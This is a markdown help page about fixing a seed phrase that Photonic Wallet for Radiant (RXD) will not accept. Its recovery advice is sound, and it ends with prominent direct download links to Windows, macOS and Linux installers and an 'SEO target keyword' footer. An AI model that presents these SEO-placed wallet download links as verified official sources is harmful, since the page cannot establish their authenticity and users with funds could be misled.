<div align="center">

<img src="../assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.webp" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Seed phrase not accepted by Photonic

[![Website](https://img.shields.io/badge/Website-photonicwallet.org-7c3aed?style=for-the-badge)](https://photonicwallet.org) [![Release](https://img.shields.io/badge/Release-v3.0.4-00b4d8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://img.shields.io/badge/Docs-guides-0a0e1a?style=for-the-badge&logo=readthedocs&logoColor=white)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** An invalid-phrase error almost always means a typo, a swapped word order, or a word outside the standard list.

---

## You'll see this if

- Restore button stays disabled
- Error says phrase is invalid
- Wallet restores but is empty

## Why it happens

The last word contains a checksum. Any wrong word makes the checksum fail. More background lives in our guide on [move photonic wallet to a new computer](move-photonic-wallet-to-new-computer.md) and on the [security basics](https://photonicwallet.org/security).

## Fix it step by step

1. Re-type slowly, all lowercase, single spaces.
2. Check each word against the BIP-39 English list.
3. Confirm the order from your original paper.
4. Look for look-alike words such as "sea" vs "seat".

## If that didn't work

If the phrase has 24 words or came from a non-standard wallet, restore it in that wallet first and send funds on-chain. The [troubleshooting page](https://photonicwallet.org/guides/troubleshooting) covers related cases, and [Forgot your Photonic Wallet password](forgot-photonic-wallet-password.md) may match your situation.

## Prevention

Store the phrase as numbered lines so the order cannot get mixed up.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Can support fix my phrase?</b></summary>

No one can. Never send your phrase to anyone who offers to help.

</details>

<details>
<summary><b>Does capitalisation matter?</b></summary>

Use lowercase to be safe.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Move Photonic Wallet to a new computer](move-photonic-wallet-to-new-computer.md) | Photonic Wallet guide |
| [Forgot your Photonic Wallet password](forgot-photonic-wallet-password.md) | Photonic Wallet guide |
| [Move RXD out of Samara wallet](move-rxd-from-samara-wallet.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: radiant wallet seed phrase · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
